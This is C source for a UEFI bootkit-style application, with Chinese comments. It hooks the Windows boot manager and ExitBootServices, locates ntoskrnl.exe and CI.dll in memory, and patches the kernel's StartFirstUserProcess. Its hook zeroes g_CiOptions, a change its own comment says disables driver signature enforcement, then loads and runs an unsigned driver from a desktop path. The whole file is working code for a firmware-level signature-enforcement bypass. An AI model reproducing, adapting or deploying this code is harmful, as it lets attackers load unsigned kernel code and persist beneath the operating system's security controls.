#include <Uefi.h>
#include <PiMultiPhase.h>
#include <MpService.h>
#include <FileInfo.h>
#include <SimpleFileSystem.h>
#include <DevicePathFromText.h>
#include <DevicePathToText.h>
#include <DevicePathFromText.h>
#include <DevicePathUtilities.h>
#include <LoadedImage.h>

#include "type.h"
#include "wintype.h"

#include "first.h"
#include "intel.h"
#include "std.h"
#include "util.h"
#include "hook.h"
#include "pe64.h"
#include "vmx.h"
#include "ept.h"

PVT efipvt;
PVM efipvm;

PVT ospvt;
PVM ospvm;

UINTN TotalCPU = 0;
PLDR_DATA_TABLE_ENTRY kernelModule;
uint32 *g_CiOptions;
void *StartFirstUserProcess;
char Savecode[0x40];

UINTN OsMode = FirmwareContext;

EFI_SYSTEM_TABLE *gST;
EFI_HANDLE *gIH;

typedef UINTN (*IMGARCHSTARTBOOTAPPLICATION)(PBL_APPLICATION_ENTRY AppEntry, void *ImageBase, uint32 ImageSize, char StartFlags, UINTN ReturnArgs);
typedef UINTN (*BLPARCHSWITCHCONTEXT)(int mode);

EFI_EXIT_BOOT_SERVICES mOriginalExitBootServices;
EFI_EVENT VirtualAddressChangeEvent;
PLOADER_PARAMETER_BLOCK pOslLoaderBlock;
BLPARCHSWITCHCONTEXT BlpArchSwitchContext;

uint64 InitOsApi(PVT vt, void *NtosKernelBase);

PLDR_DATA_TABLE_ENTRY Efi_GetModules(LIST_ENTRY *list, wchar *name)
{
    for (LIST_ENTRY *entry = list->Flink; entry != list; entry = entry->Flink)
    {
        PLDR_DATA_TABLE_ENTRY module = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (module)
        {
            if (name)
            {
                if (std_wstricmp(name, module->BaseDllName.Buffer))
                    return module;
            }
            else
            {
                wchar TempWCHAR[0x32] = {0};
                uint64 base = (uint64)module->DllBase;
                wstrcpy(TempWCHAR, module->BaseDllName.Buffer, 0x30);
                efi_Print(L"%S ", TempWCHAR);
            }
        }
    }

    return 0;
}

uint64 GetTotalPages()
{
    EFI_STATUS Status;
    EFI_MEMORY_DESCRIPTOR *MemoryMap;
    UINTN MemoryMapSize = 0x800, MapKey, DescriptorSize;
    UINT32 DescriptorVersion;

    // 分配内存映射表所需的空间
    Status = gST->BootServices->AllocatePool(EfiLoaderData, MemoryMapSize, (VOID **)&MemoryMap);
    if (EFI_ERROR(Status))
        return Status;

    // 获取内存映射表的大小
    Status = gST->BootServices->GetMemoryMap(&MemoryMapSize, MemoryMap, &MapKey, &DescriptorSize, &DescriptorVersion);
    if (EFI_ERROR(Status))
    {
        // if (Status == EFI_BUFFER_TOO_SMALL)
        return Status;
    }

    EFI_PRINT(L"Status:%x64,MemoryMapSize:%x64,DescriptorSize:%x64,DescriptorVersion:%x64\r\n", Status, MemoryMapSize, DescriptorSize, DescriptorVersion);

    uint64 TotalMemory = 0;
    // 遍历内存映射表
    UINTN NumEntries = MemoryMapSize / DescriptorSize;
    for (UINTN i = 0; i < NumEntries; i++)
    {
        EFI_MEMORY_DESCRIPTOR *Descriptor = (EFI_MEMORY_DESCRIPTOR *)((UINTN)MemoryMap + i * DescriptorSize);
        TotalMemory += Descriptor->NumberOfPages;
    }

    // 释放内存映射表
    gST->BootServices->FreePool(MemoryMap);
    efi_Print(L"TotalMemory:%x64\r\n", TotalMemory);
    efi_WaiteForAnyKey(L"TotalMemory");

    return TotalMemory;
}

EFI_STATUS HookImgStartBootApp(PBL_APPLICATION_ENTRY AppEntry, void *ImageBase, uint32 ImageSize, uint8 StartFlags, UINTN ReturnArgs)
{
    EFI_PRINT(L"ImageBase:%x64\r\n", ImageBase);
    EFI_PRINT(L"ImageSize:%x64\r\n", ImageSize);
    EFI_PRINT(L"StartFlags:%x08\r\n", StartFlags);
    EFI_PRINT(L"sign:%x16\r\n", *(uint16 *)ImageBase);

    EFI_PRINT(L"AppEntry:%x64\r\n", AppEntry);
    EFI_PRINT(L"->Signature:%x64\r\n", AppEntry->Signature);
    EFI_PRINT(L"->Flags:%x32\r\n", AppEntry->Flags);

    BlpArchSwitchContext = std_FindCode(ImageBase, ImageSize, SwitchContext.Binary);
    EFI_PRINT(L"BlpArchSwitchContext:%x64\r\n", BlpArchSwitchContext);

    UINTN OslLoaderBlock = (UINTN)std_FindCode(ImageBase, ImageSize, LoaderBlock.Binary);
    UINTN offset = OslLoaderBlock + 19;
    pOslLoaderBlock = (PLOADER_PARAMETER_BLOCK)(offset + 4 + *(uint32 *)offset);
    EFI_PRINT(L"OslLoaderBlock Addr:%x64\r\n", pOslLoaderBlock);

    UnHook(&StartBoot);

    efi_WaiteForAnyKey(L"StartBootApp");

    return ((IMGARCHSTARTBOOTAPPLICATION)StartBoot.OriFunc)(AppEntry, ImageBase, ImageSize, StartFlags, ReturnArgs);
}

EFI_STATUS HookedExitBootServices(IN EFI_HANDLE ImageHandle, IN UINTN MapKey)
{
    efi_WaiteForAnyKey(L"ExitBootServices");

    gST->BootServices->ExitBootServices = mOriginalExitBootServices; // 还原Hook
    gST->ConOut->SetAttribute(gST->ConOut, EFI_LIGHTGREEN);
    gST->ConOut->SetAttribute(gST->ConOut, EFI_CYAN);

    BlpArchSwitchContext(ApplicationContext);
    OsMode = ApplicationContext;
    EFI_PRINT(L"Inside ApplicationContext\r\n");

    // pOslLoader = (PLOADER_PARAMETER_BLOCK)(*(UINTN *)pOslLoaderBlock);

    PLOADER_PARAMETER_BLOCK pOslLoader = (PLOADER_PARAMETER_BLOCK)(*(UINTN *)pOslLoaderBlock);
    efipvt->Os.Data.pOslLoaderBlock = pOslLoader;

    EFI_PRINT(L"LoaderBlock->Addr:%x64\r\n", pOslLoader);
    EFI_PRINT(L"MajorVersion:%x32\r\nOsMinorVersion:%x32\r\n", pOslLoader->OsMajorVersion, pOslLoader->OsMinorVersion);
    EFI_PRINT(L"loaderBlock->Size:%x32\r\n", pOslLoader->Size);

    // 第二个参数为NULL,打印所有模块
    // kernelModule = GetModules(&pOslLoader->LoadOrderListHead, NULL);
    kernelModule = Efi_GetModules(&pOslLoader->LoadOrderListHead, L"ntoskrnl.exe");
    if (kernelModule->DllBase)
    {
        BlpArchSwitchContext(FirmwareContext);
        OsMode = FirmwareContext;
        gST->ConOut->SetAttribute(gST->ConOut, EFI_LIGHTRED);
        EFI_PRINT(L"\r\n\r\nCongratulations Ntoskrnl Found!!!\r\n\r\n\r\n");
        gST->ConOut->SetAttribute(gST->ConOut, EFI_CYAN);
        BlpArchSwitchContext(ApplicationContext);
        OsMode = ApplicationContext;

        efipvt->Os.Data.kernelModule = kernelModule;
        efipvt->Os.Data.kernelCR3 = readCR3();

        UINTN base = (UINTN)kernelModule->DllBase;
        uint16 sign = *(uint16 *)kernelModule->DllBase;
        UINTN size = kernelModule->SizeOfImage;
        wchar name[0x100] = {0};
        wstrcpy(name, kernelModule->FullDllName.Buffer, 0xF0);

        EFI_PRINT(L"kernelModule->Base:%x64\r\n", base);
        EFI_PRINT(L"kernelModule->sign:%x16\r\n", sign);
        EFI_PRINT(L"kernelModule->size:%x32\r\n", size);
        EFI_PRINT(L"kernelModule->name:%S\r\n", name);

        UINTN vaddr = base + GetSectionVirtualAddress((void *)base, "INIT");
        UINTN vsize = GetSectionVirtualSize((void *)base, "INIT");

        EFI_PRINT(L"Section addr:%x64 size:%x64\r\n", vaddr, vsize);

        StartFirstUserProcess = std_FindCode((char *)vaddr, vsize, StartFirst.Binary);
        EFI_PRINT(L"StartFirstUserProcess:%x64\r\n", StartFirstUserProcess);
    }
    else
    {
        EFI_PRINT(L"ntoskrnl Not Found!!!\r\n", 0);
    }

    // 导出表 查找 CI模块
    PLDR_DATA_TABLE_ENTRY CIModule = Efi_GetModules(&pOslLoader->LoadOrderListHead, L"CI.dll");
    if (CIModule)
    {
        EFI_PRINT(L"CIModule Found!!! addr %x64\r\n", CIModule->DllBase);

        UINTN vaddr = (UINTN)CIModule->DllBase + (UINTN)GetSectionVirtualAddress(CIModule->DllBase, "PAGE");
        UINTN vsize = GetSectionVirtualSize(CIModule->DllBase, "PAGE");

        UINTN g_CiOptionsAddr = (UINTN)std_FindCode((char *)vaddr, vsize, CiOptions.Binary);

        EFI_PRINT(L"g_CiOptions std_FindCode:%x64\r\n", g_CiOptionsAddr);
        if (g_CiOptionsAddr)
        {
            int64 offset64 = (int64)(*(int32 *)(g_CiOptionsAddr + 2));
            efipvt->Os.Data.g_CiOptions = (uint32 *)((g_CiOptionsAddr + 6) + offset64);
            EFI_PRINT(L"64 g_CiOptions addr:%x64 , value:%x32\r\n", g_CiOptions, *(uint32 *)g_CiOptions);
        }
    }
    else
    {
        EFI_PRINT(L"CI Not Found!!!\r\n", 0);
    }

    BlpArchSwitchContext(FirmwareContext);
    OsMode = FirmwareContext;

    efi_WaiteForAnyKey(L"Start OS!");
    return gST->BootServices->ExitBootServices(ImageHandle, MapKey);
}

VOID HookStartFirstUserProcess()
{
    InitOsApi(ospvt, ospvt->Os.Data.kernelModule->DllBase);

    long ret;
    wchar SysPath[] = {L"\\??\\C:\\Users\\Sylar\\Desktop\\TestVT.sys"};
    // wchar SysPath[] = {L"\\??\\C:\\Users\\qpalz\\Desktop\\TestVT.sys"};

    void *ImageBase = 0;
    void *ImageEntry = 0;

    char shellcode[] = {"EB 04 DE AD C0 DE"};

    UNICODE_STRING filename;
    ospvt->Os.Api.RtlInitUnicodeString(&filename, SysPath);

    // 0=禁用签名,6=开启签名,8=测试签名
    uint32 saveCI = *ospvt->Os.Data.g_CiOptions;
    *ospvt->Os.Data.g_CiOptions = 0;

    ret = ospvt->Os.Api.MmLoadSystemImage(&filename, 0, 0, 0, &ImageEntry, &ImageBase);

    *ospvt->Os.Data.g_CiOptions = saveCI;

    if (ImageBase)
    {
        typedef void (*func)(void*);
        func entry;
        entry = (func)std_FindCode(ImageBase, GetSizeOfImage(ImageBase), shellcode);
        entry(ospvt->Os.Data.kernelModule->DllBase);
    }

    // 获取StartFirstUserProcess物理地址
    void *MapFirst = ospvt->Os.Api.MmGetPhysicalAddress(StartFirstUserProcess);
    // 映射内存,以便修改,参数3(0==MmNonCached)
    void *pAddr = ospvt->Os.Api.MmMapIoSpace(MapFirst, 0x200, 0);
    if (pAddr)
    {
        // 还原函数
        std_memcpy(pAddr, Savecode, 0x30);
    }
    // 释放映射内存
    ospvt->Os.Api.MmUnmapIoSpace(pAddr, 0x30);
}

VOID EFIAPI SetVirtualAddressMap(EFI_EVENT Event, VOID *Context)
{
    // 映射到虚拟内存
    void *HookCode = (uint64 *)HookStartFirst;
    void *HookAddr = (uint64 *)HookStartFirstUserProcess;
    void *HookTransit = (uint64 *)HookFirstTransit;
    gST->RuntimeServices->ConvertPointer(EFI_OPTIONAL_PTR, (void **)&HookCode);
    gST->RuntimeServices->ConvertPointer(EFI_OPTIONAL_PTR, (void **)&HookAddr);
    gST->RuntimeServices->ConvertPointer(EFI_OPTIONAL_PTR, (void **)&HookTransit);

    ospvt = efipvt;
    gST->RuntimeServices->ConvertPointer(EFI_OPTIONAL_PTR, (void **)&ospvt);

    // 修改HOOK函数
    *(uint64 *)((uint64)HookCode + 2) = (uint64)HookTransit;
    *(uint64 *)((uint64)HookTransit + 2) = (uint64)StartFirstUserProcess;

    // 保存代码
    std_memcpy(Savecode, StartFirstUserProcess, 0x30);
    // 替换代码
    std_memcpy(StartFirstUserProcess, HookCode, 0x30);
}

EFI_STATUS StartImageBootmgfw(IN EFI_DEVICE_PATH_PROTOCOL *IoFilePath)
{
    EFI_STATUS status = EFI_SUCCESS;

    EFI_HANDLE ImageHandle;
    EFI_LOADED_IMAGE *LoadImage;
    EFI_GUID LOAD_IMAGE_GUID = EFI_LOADED_IMAGE_PROTOCOL_GUID;

    status = gST->BootServices->LoadImage(FALSE, gIH, IoFilePath, NULL, 0, &ImageHandle);
    EFI_DEBUG(status);

    status = gST->BootServices->HandleProtocol(ImageHandle, &LOAD_IMAGE_GUID, (void **)&LoadImage);
    EFI_DEBUG(status);

    EFI_PRINT(L"LoadImage:Base:%x64,size:%x64,Sign:%x64\r\n", LoadImage->ImageBase, LoadImage->ImageSize, *(uint16 *)LoadImage->ImageBase);

    /*HOOK ImgFwStartBootApplication*/
    char *address = std_FindCode(LoadImage->ImageBase, LoadImage->ImageSize, StartBoot.Binary);
    EFI_PRINT(L"ImgArchStartBootApplication addr=%x64\r\n", address);

    if (address)
    {
        StartBoot.HookAddr = address;
        StartBoot.HookFunc = HookImgStartBootApp;
        StartBoot.HookType = HOOK_TYPE_INLINE;
        Hook(&StartBoot);
    }
    efi_WaiteForAnyKey(L"Bootmgfw...");
    return gST->BootServices->StartImage(ImageHandle, NULL, NULL);
}

EFI_STATUS EFIAPI UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable)
{
    EFI_STATUS status = EFI_SUCCESS;

    gST = SystemTable;
    gIH = ImageHandle;

    gST->BootServices->SetWatchdogTimer(0, 0, 0, NULL);
    gST->ConOut->ClearScreen(gST->ConOut);
    gST->ConOut->SetAttribute(gST->ConOut, EFI_GREEN);

    efi_WaiteForAnyKey(L"Init...");

    if (IsSupportVT())
    {
        gST->BootServices->CreateEvent(EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE, TPL_NOTIFY, SetVirtualAddressMap, NULL, &VirtualAddressChangeEvent);

        status = gST->BootServices->AllocatePool(EfiRuntimeServicesData, sizeof(VT), (void **)&efipvt);
        EFI_DEBUG(status);
        std_memset(efipvt, sizeof(VT), 0);

        mOriginalExitBootServices = gST->BootServices->ExitBootServices;
        gST->BootServices->ExitBootServices = HookedExitBootServices;

        efi_WaiteForAnyKey(L"Hack Loading...");
        return efi_CallBackStartImage(L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi", StartImageBootmgfw);
    }

    efi_WaiteForAnyKey(L"Normal Loading...");
    return efi_CallBackStartImage(L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi", efi_StartImage);
}

EFI_STATUS EFIAPI UefiUnload(EFI_HANDLE ImageHandle)
{
    return EFI_ABORTED;
}